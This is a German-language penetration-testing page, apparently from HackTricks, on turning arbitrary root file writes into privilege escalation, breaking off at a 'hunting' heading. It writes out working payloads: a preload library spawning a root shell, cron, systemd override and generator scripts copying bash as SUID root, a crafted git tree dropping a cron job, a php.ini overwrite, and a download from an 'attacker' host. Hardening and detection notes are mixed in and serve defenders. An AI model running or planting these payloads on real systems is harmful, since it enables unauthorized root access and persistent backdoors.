# Beliebiger Dateischreibzugriff als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste gemeinsam genutzter Objekte, die der dynamische Linker vor anderen gemeinsam genutzten Objekten lädt. Der Secure-Execution-Modus schränkt das Preloading zusätzlich ein, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-Binaries.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei lädt, die aufgeführte Bibliothek vor seinen anderen gemeinsam genutzten Objekten und ermöglicht so die Codeausführung im Kontext dieses Prozesses.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, darunter Commit- und Merge-Vorgänge. Wenn ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen ausführt und ein Angreifer in den Ordner **`.git` schreiben** kann, lässt sich der Hook zur **Privilege Escalation** nutzen.<sup>[[13]](#references)</sup>

Zum Beispiel kann in einem Git-Repository unter **`.git/hooks`** ein **Skript erstellt** werden, das immer ausgeführt wird, wenn ein neuer Commit erstellt wird:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privilegierter Git-Tree-Export mit path traversal

Ein privilegierter Synchronizer verzichtet möglicherweise auf einen Checkout und listet stattdessen mit `git ls-tree` ein vom Angreifer beeinflusstes Repository auf, liest jeden Blob mit `git cat-file`, verbindet den gemeldeten Pfadnamen mit einem Staging-Verzeichnis und schreibt die Datei selbst. Wenn er `-c safe.directory=*` (deaktiviert Git's Schutz für Repositories mit anderem Eigentümer) mit einer fehlenden Prüfung kombiniert, ob das Ziel innerhalb des Staging-Verzeichnisses liegt, entsteht ein **arbitrary file write mit den Privilegien des Synchronizers**. Ein absoluter Tree-Eintragsname führt dazu, dass Python mit `os.path.join(stage, name)` `stage` verwirft; ein relativer Name mit `../` entkommt dem Verzeichnis, wenn das Dateisystem den Pfad auflöst. Da die Anwendung den rohen Tree selbst materialisiert, statt Git mit dem Checkout zu beauftragen, schützt die Pfadnamenvalidierung während des Checkouts das Ziel nicht.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Achten Sie in Root-Diensten, Timern, Deployment-Agenten, Template-Importern und Backup-/Restore-Jobs auf dieses Code-Muster:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Ein Tree-Eintrag wird als `<mode> SP <name> NUL <raw object ID>` kodiert. Die Option `git hash-object --literally` erlaubt absichtlich Objektdaten, die bei normaler Analyse oder von `git fsck` möglicherweise abgelehnt werden. So kann ein Wegwerf-Clone einen Tree erstellen, dessen Dateiname ein absolutes Ziel ist. Dieses Beispiel erstellt einen Cron-Datei-Blob, verpackt den präparierten Tree in einen Commit und setzt einen Branch darauf. Für die Ausnutzung sind weiterhin die Berechtigung erforderlich, ein von einem privilegierten Job verwendetes Repository zu aktualisieren, sowie ein Git-Server, der das fehlerhafte Objekt akzeptiert.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening muss sowohl die Repository-Aufnahme als auch den abschließenden Dateisystemvorgang abdecken:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Ersetze `safe.directory=*` durch die konkreten Repositories, denen der Dienst vertrauen muss, und verarbeite Repositories nach Möglichkeit ohne Root-Rechte.
- Weise absolute Namen und alle `.`- oder `..`-Komponenten vor der Materialisierung zurück. Kanonisiere das Ziel nach dem Zusammenfügen und überprüfe, dass es innerhalb des vorgesehenen Stammverzeichnisses bleibt.
- Vermeide Symlink-Races durch Prüfen und anschließendes Öffnen: Öffne relativ zu einem vertrauenswürdigen Verzeichnis-Deskriptor und verwende unter Linux für angreiferkontrollierte Pfade `openat2()` mit `RESOLVE_BENEATH` und `RESOLVE_NO_SYMLINKS`.
- Bevorzuge einen normalen Checkout in einem isolierten Verzeichnis, anstatt den Checkout anhand von Plumbing-Ausgaben neu zu implementieren. Wenn die Aufnahme von Raw Objects erforderlich ist, aktiviere eine Validierung auf der Empfangsseite, etwa mit `receive.fsckObjects=true`; stufe die pfadbezogenen `receive.fsck.*`-Befunde, die zum Zurückweisen manipulierter Trees erforderlich sind, nicht herab.

### Bereitstellung privilegierter Konfiguration

Einige Verwaltungsdienste speichern den vorgesehenen Systemstatus in einer Konfigurationsdatei und stellen ihn später mit erhöhten Privilegien bereit. Beispielsweise speichert [openmediavault die Konfiguration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), und seine [RPC-Schnittstelle](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) kann Dienständerungen anwenden. Wenn ein Konto mit geringeren Privilegien diese Datei schreiben oder ersetzen kann, prüfe, ob es auch eine autorisierte Bereitstellung anfordern kann und ob das ausgewählte Modul das geänderte Feld als Root verarbeitet. SSH-Kontoschlüssel, geplante Befehle und die Paketinstallation haben jeweils unterschiedliche Voraussetzungen; das bloße Vorhandensein einer Datei oder eine beschreibbare XML-Datei beweist keines davon. Prüfe Dateiberechtigungen und Berechtigungen des übergeordneten Verzeichnisses, Gruppen und RPC-Autorisierung des Aufrufers, installierte Version sowie den tatsächlichen Verbraucher, ohne die Konfiguration während der Bestandsaufnahme zu bearbeiten oder einen Apply-Vorgang auszulösen.

Fail2Ban-Aktionsdefinitionen unter `/etc/fail2ban/action.d/` bilden eine weitere Grenze für privilegierte Konfiguration. Ein Benutzer, der dieses Verzeichnis beschreiben und durchsuchen kann, kann möglicherweise eine Aktionsdefinition ersetzen oder einen Override hinzufügen; Verzeichnisberechtigungen allein belegen jedoch keine Codeausführung. Bestätige, dass ein aktiviertes Jail tatsächlich die betroffene Aktion auswählt, dass der Fail2Ban-Dienst sie mit höheren Privilegien ausführt und dass ein autorisierter Reload/Neustart sowie ein passendes Ban-Ereignis stattfinden werden. Eine unabhängige sudo-Berechtigung zum Neustarten von Fail2Ban ist nur relevant, wenn sie für den konkreten Dienstaufruf gilt und die geänderte Definition geladen wird. [Die Aktionskonfiguration von Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) dokumentiert den Zusammenhang zwischen Aktionsverzeichnis und Jail; die [Beispielaktion](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) zeigt, dass `actionban` bei einem Ban mit den Rechten des Dienstbenutzers ausgeführt wird. Prüfe Berechtigungen und effektive Konfiguration, ohne Aktionen zu ändern oder während der Bestandsaufnahme Bans auszulösen.

Eine separate Grenze besteht, wenn ein aktiviertes Fail2Ban-Jail eine WHOIS-angereicherte Mail-Aktion verwendet. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) betraf nicht vertrauenswürdigen WHOIS-Text, der an GNU mailutils `mail` weitergeleitet wurde, dessen Escape-Verarbeitung einen Befehl ausführen konnte. Ein Benutzer mit geringeren Privilegien, der Dateien schreiben kann, kann die Antwort möglicherweise beeinflussen, wenn er die Server-Override-Konfiguration des **ausgewählten WHOIS-Clients** ändern kann; [Debians `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentiert eine solche Datei, aber Pfad und Verwendung variieren je nach Installation. Prüfe das effektive Jail/die effektive Aktion, die Dienstidentität, den tatsächlichen WHOIS-Client und Konfigurationspfad, die Mail-Implementierung, die Kontrolle über die Antwort sowie den installierten Hersteller-Fix oder Backport. Eine beschreibbare WHOIS-Konfigurationsdatei, eine Fail2Ban-Version oder eine Mail-Aktion allein belegt diese Angriffskette nicht; vermeide während der passiven Bestandsaufnahme Abfragen an externe Server und das Auslösen von Bans.

### TFTP-Dateierstellung und privilegierte Paket-Hooks

Ein zugänglicher TFTP-Dienst kann eine Container- oder lokale Benutzergrenze überschreiten, wenn seine **effektiven** tftpd-hpa-Einstellungen ihn als Root ausführen, mit `--secure` das Dateisystem-Stammverzeichnis freigeben und `--create` aktivieren. [Das tftpd-hpa-Handbuch](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) beschreibt die Optionen zur Dateierstellung und zum Benutzer. Damit kommt die Erstellung einer neuen Datei in einem privilegierten Konfigurationsverzeichnis, einschließlich `/etc/apt/apt.conf.d/`, infrage; eine vorhandene Datei lässt sich möglicherweise dennoch nicht ersetzen. [Das APT-Konfigurationshandbuch](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentiert `APT::Update::Pre-Invoke`-Befehle. Ein als Root ausgeführtes `apt update` kann nur dann zum Verbraucher mit höheren Privilegien werden, **wenn** es die neue Konfigurationsdatei einliest. Bestätige die tatsächlichen Argumente und die Identität des laufenden Daemons, Netzwerk-Erreichbarkeit und Filterung, die Richtlinie zur Dateierstellung im Zielverzeichnis, den effektiven Geltungsbereich der APT-Konfiguration sowie einen späteren privilegierten Aufruf. Eine Standarddatei, ein beschreibbares Zielverzeichnis oder ein geplanter APT-Befehl allein belegt nicht den gesamten Angriffsweg. Eine passive Triage sollte nur begrenzte lokale Konfiguration und Metadaten lesen, ohne eine Datei hochzuladen oder APT aufzurufen.

### Cron- und Zeitdateien

Wenn du **cron-bezogene Dateien schreiben kannst, die Root ausführt**, kannst du normalerweise beim nächsten Joblauf Code ausführen. Interessante Ziele sind:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die Crontab von Root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen gestarteten Dienste

Schnellprüfungen:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typische Missbrauchswege:

- **Einen neuen root cron job an** `/etc/crontab` oder eine Datei in `/etc/cron.d/` anhängen
- **Ein Skript ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Ein vorhandenes Timer-Ziel mit einer Backdoor versehen**, indem das Skript oder Binary geändert wird, das es startet

Minimales Beispiel für einen cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Wenn du nur in ein von `run-parts` verwendetes cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` ignoriert normalerweise Dateinamen mit Punkten, daher sind Namen wie `backup` statt `backup.sh` vorzuziehen.<sup>[[15]](#references)</sup>
- Manche Systeme verwenden `systemd`-Timer statt des klassischen cron, aber die Idee des Missbrauchs ist dieselbe: **ändern, was root später ausführt**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder darin referenzierte Dateien beschreiben kannst, kannst du möglicherweise Code als root ausführen, indem du die Unit neu lädst und neu startest oder wartest, bis der Service-/Socket-Aktivierungspfad ausgelöst wird.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Prüfe auch Schreib- und Suchzugriff auf das System-Unit-Verzeichnis selbst, einschließlich ACLs: Ein Benutzer kann eine neue Unit in `/etc/systemd/system` erstellen, selbst wenn das Lesen/Auflisten des Verzeichnisses verweigert wird. Dieser Pfad allein startet nichts. Stelle sicher, dass der Systemmanager die neue Unit lädt, dass der Aufrufer für ihren Namen eine effektive root-berechtigte `systemctl start`- oder `restart`-Berechtigung hat (oder ein anderer privilegierter Aktivierungspfad vorhanden ist) und dass der Service unter der vorgesehenen Identität läuft. Bei einer bestehenden, geladenen Unit, die auf der Festplatte geändert wurde, ist möglicherweise `daemon-reload` erforderlich; für eine neu benannte Unit gelten andere Ladebedingungen. Prüfe die genauen sudo-Argumente und Ausschlüsse, bevor du eine Wildcard-Regel für Neustarts als ausreichend betrachtest. Siehe den [systemd-Unit-Suchpfad](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) und die [Lade- und Reload-Semantik von systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/-Binärdateien, auf die `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verweisen
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnelle Prüfungen:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-eigenen Dienst-Unit, die du ändern kannst
- **Ein Drop-in-Override hinzufügen** mit einem bösartigen `ExecStart=` und den alten Eintrag zuerst löschen
- Das bereits von der Unit referenzierte Skript/Programm mit einer Backdoor versehen
- Einen socket-aktivierten Dienst kapern, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, wenn der Socket eine Verbindung empfängt

Beispiel für ein bösartiges Override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typischer Aktivierungsablauf:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Wenn du Services nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Clientverbindung warten**, um die Ausführung des mit einer Backdoor versehenen Services als root auszulösen.<sup>[[17]](#references)</sup>

### systemd-Generatorverzeichnisse

**Systemgeneratoren** sind ausführbare Dateien, die der Systemmanager startet, bevor er Unit-Dateien lädt – sowohl während des Bootvorgangs als auch beim Neuladen der Konfiguration. Schreibzugriff auf ein Systemgeneratorverzeichnis (oder auf einen vorhandenen ausführbaren Generator) ermöglicht daher direkt die Ausführung von Code als root. Das wird bei Audits leicht übersehen, wenn nur `*.service`- und `*.timer`-Dateien geprüft werden.<sup>[[35]](#references)[[36]](#references)</sup>

Die übliche Suchreihenfolge ist `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` und `/usr/lib/systemd/system-generators/` (manche Distributionen stellen `/lib/systemd/system-generators/` über den `/usr`-Merge bereit). Eine ausführbare Datei mit demselben Namen in einem früheren Verzeichnis hat Vorrang vor einer späteren. Verwechsle diese **Eingabeverzeichnisse für ausführbare Dateien** nicht mit `/run/systemd/generator`, `/run/systemd/generator.early` und `/run/systemd/generator.late`, in denen von Generatoren erzeugte temporäre Unit-Ausgaben liegen.<sup>[[35]](#references)</sup>

Schnellprüfungen:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Ein neu erstellter Generator muss das Ausführungsbit gesetzt haben. Wenn die Schreibprimitive Bytes, aber nicht den Modus kontrolliert, ziele auf einen bereits ausführbaren Generator; ihn direkt zu kürzen, erhält normalerweise seine Metadaten. Wenn das Verzeichnis selbst beschreibbar ist, erstelle einen neuen Eintrag und setze ihn als ausführbar.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Das Ausführen von `systemctl daemon-reload` für den **system**-Manager erfordert eine entsprechende Autorisierung, führt aber alle System-Generatoren erneut aus; andernfalls musst du auf ein privilegiertes Neuladen, einen Paketvorgang oder einen Neustart warten. Benutzer-Generator-Verzeichnisse wie `~/.config/systemd/user-generators/` werden unter dem Benutzer-Manager ausgeführt und verschaffen **nicht** von sich aus Root-Zugriff.<sup>[[35]](#references)</sup>

Zur Härtung und bei der Suche nach Bedrohungen solltest du jede Pfadkomponente und ACL überprüfen, nicht nur die abschließenden Modus-Bits, Hashes und Paketzugehörigkeit der Generatoren als Baseline erfassen und Änderungen beim Erstellen, Umbenennen, Ändern des Inhalts oder der Berechtigungen in allen Eingabeverzeichnissen der System-Generatoren melden. Die Überwachung von Schreibzugriffen ist wichtig, weil sich ein einmalig ausgeführter Generator nach der Ausführung selbst löschen kann, während der generierte Unit-Baum unter `/run/systemd/generator*` beim nächsten Neuladen neu erstellt wird.<sup>[[35]](#references)[[36]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons überprüfen benutzerbereitgestellten PHP-Code, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel mit `disable_functions=exec,system,...`). Wenn der Sandbox-Code dennoch **irgendeinen Schreib-Primitiv** (wie `file_put_contents`) enthält und du den **exakten `php.ini`-Pfad** des Daemons erreichen kannst, kannst du **diese Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload übermitteln, der mit erhöhten Rechten ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Wenn der Daemon als root läuft (oder Pfade mit root-Eigentümer überprüft), führt die zweite Ausführung zu einem root-Kontext. Dies ist im Wesentlichen **privilege escalation via config overwrite**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet einem Dateitypmuster einen Interpreter zu. Die Auswirkungen auf Berechtigungen hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Überprüfe diese Voraussetzungen, bevor du dies als möglichen Weg zur privilege escalation einstufst.<sup>[[21]](#references)</sup>

Ein ausführbarer Helper mit `CAP_DAC_OVERRIDE` kann einen separaten Registrierungsweg darstellen, wenn er vom Aufrufer kontrollierte Daten entgegennimmt und in `/proc/sys/fs/binfmt_misc/register` schreibt, auch wenn der Aufrufer diesen Knoten nicht direkt beschreiben kann. Überprüfe die Eingaben und das Schreibverhalten des Helpers, ohne ihn während der Auflistung auszuführen. Wenn eine registrierte Regel das Flag `C` verwendet, erhält der Interpreter Berechtigungen auf Grundlage der übereinstimmenden Binärdatei; eine root-eigene SUID-Datei kann dadurch einen vom Aufrufer kontrollierten Interpreter als root ausführen. Überprüfe den `binfmt_misc`-Mount und die Registrierungsrichtlinie, die effektiven Capabilities des Helpers, die genaue Regel und den Interpreter-Pfad, das ausführbare SUID-Ziel sowie, ob `no_new_privs` oder ein `nosuid`-Mount den SUID-Wechsel verhindert. Ein Capability-Bit oder ein eingebetteter Pfadstring ist allein nur ein Hinweis für eine weitere Überprüfung.<sup>[[21]](#references)</sup> Siehe [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) zu den Bedingungen, unter denen SUID unterdrückt wird.

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Einträge, um eine Anwendung für URI-Schemes auszuwählen. Ein Angreifer, der die relevanten Verzeichnisse für benutzerspezifische Konfigurationen und Desktop-Einträge beschreiben kann, kann diese Schemes auf einen von ihm kontrollierten Launcher umleiten. Indem die Datei `$HOME/.config/mimeapps.list` so geändert wird, dass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei verweisen (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Klick des Benutzers diesen Desktop-Eintrag aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Von Root ausgeführte, für Benutzer beschreibbare Skripte/Binärdateien

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` (oder eine Binärdatei in einem Verzeichnis, das einem nicht privilegierten Benutzer gehört) ausführt, kannst du es hijacken:<sup>[[1]](#references)</sup>

- **Ausführung erkennen:** Überwache Prozesse mit pspy, um zu erkennen, wann Root benutzergesteuerte Pfade aufruft.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören oder für ihn beschreibbar sind.
- **Ziel kapern:** Sichere die ursprüngliche Binärdatei bzw. das ursprüngliche Skript und lege eine Payload ab, die eine SUID-Shell erstellt (oder eine andere Aktion als root ausführt). Stelle anschließend die Berechtigungen wieder her:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den gekaperten Pfad erneut ausführt, mit `./rootshell -p` die eskalierte Shell übernehmen.

### Änderung privilegierter Binaries nur im Page Cache

Manche Kernel-Bugs ändern die Datei **auf der Festplatte** nicht. Stattdessen erlauben sie dir, nur die **Kopie einer lesbaren Datei im Page Cache** zu ändern. Wenn du ein **setuid**-Binary oder eine andere **als root ausgeführte** Datei als Ziel verwenden kannst, kann bei der nächsten Ausführung vom Angreifer kontrollierter Code aus dem Speicher ausgeführt werden und die Rechteausweitung erfolgen, obwohl der Hash der Datei auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Diese Technik lässt sich als **nur zur Laufzeit wirksame Datei-Schreibprimitive** verstehen:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt unverändert**: Der Inode und die Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Seite lesen oder ausführen, erhalten den vom Angreifer geänderten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder wenn der Cache-Eintrag verworfen wird

Diese Primitive liegt zwischen klassischem **arbitrary file write** und älteren **Page-Cache-Abuse**-Bugs wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW beruhte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Eine nur den Page Cache betreffende Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe in gecachte, dateigestützte Seiten ermöglicht

#### Generischer Privesc-Ablauf

1. Eine Kernel-Primitive erlangen, die in **dateigestützte Page-Cache-Seiten** schreiben kann
2. Sie gegen ein **lesbares privilegiertes Binary** oder eine andere als root ausgeführte Datei einsetzen
3. Die Ausführung auslösen, **bevor** die Seite aus dem Cache verdrängt wird
4. Code als root ausführen, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root-Diensten** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsam genutztem Host-Kernel/Page-Cache** ausgeführt werden

#### Beispielpfad mit AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad lag in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Seiten aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- Der In-place-Entschlüsselungspfad von `algif_aead` verwendete Quell- und Zielpuffer erneut
- `authencesn` schrieb anschließend in den Ziel-Tag-Bereich
- Wenn dieser Bereich weiterhin auf gesplicte, dateigestützte Seiten verwies, landete der Schreibzugriff im **Page Cache der Zieldatei**

Die interessante Technik ist also nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Seiten in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als **beschreibbare Ausgabe** zu behandeln
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibzugriffe**, um `/usr/bin/su` im Speicher zu patchen, und führte es anschließend aus.<sup>[[4]](#references)[[7]](#references)</sup>

#### Beispielpfad mit ESP / XFRM + netfilter-TEE-Klon

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **nur den Page Cache betreffenden write-to-root**-Musters. Diesmal erfolgt der Schreibzugriff jedoch über **IPsec-ESP-Entschlüsselung** statt über `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtige Technik ist der **Metadata-Laundering-Schritt**:

- `splice()` platziert eine **schreibgeschützte, dateigestützte Page-Cache-Seite** in einem ESP-in-UDP-Paket
- Die ursprüngliche DirtyFrag-Mitigation markierte dieses skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Entschlüsseln eine **Kopie erstellt**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Der Klon behält dieselbe **physische Page-Cache-Referenz**, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Klon daraufhin als sicher und führt eine **In-place-Entschlüsselung mit `cbc(aes)`** über der dateigestützten Seite aus

Die Lehre für Reviewer geht über die CVE hinaus: Wenn eine Mitigation anhand von **skb-/Seiten-Metadaten** entscheidet, ob ein Vorgang zuerst eine Kopie erstellen muss, kann jeder **Klon-/Kopierpfad, der die zugrunde liegende Seite beibehält, aber die Metadaten verwirft**, die Schreibprimitive unbemerkt wieder ermöglichen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ausführen, um **`CAP_NET_ADMIN` in einem privaten Netzwerk-Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. Jedes 4-Byte-Zielwort im SA-Feld `seq_hi` kodieren (DirtyFrags Trick zur Wortauswahl)
5. Das gesplicte ESP-in-UDP-Paket senden, sodass der **TEE-Klon** `esp_input()` erreicht und **In-place** entschlüsselt wird
6. Wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei vom Angreifer kontrollierten Code enthält

In der Praxis entspricht die Auswirkung dem `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt unverändert, aber `execve()` verwendet die **veränderten Bytes im Page Cache** und verschafft root-Rechte.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Prüfungen auf eine Exposition gegenüber dieser Variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Eine kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den Clone-Pfad, während das Blockieren des Autoloads von `xt_TEE` den **Flag-Laundering-Schritt** entfernt und das Blockieren von `esp4` / `esp6` den **Decrypt-Sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure und Hunting

Wenn du diese Art von Bug vermutest, solltest du dich nicht allein auf Integritätsprüfungen der Festplatte verlassen. Überprüfe außerdem:

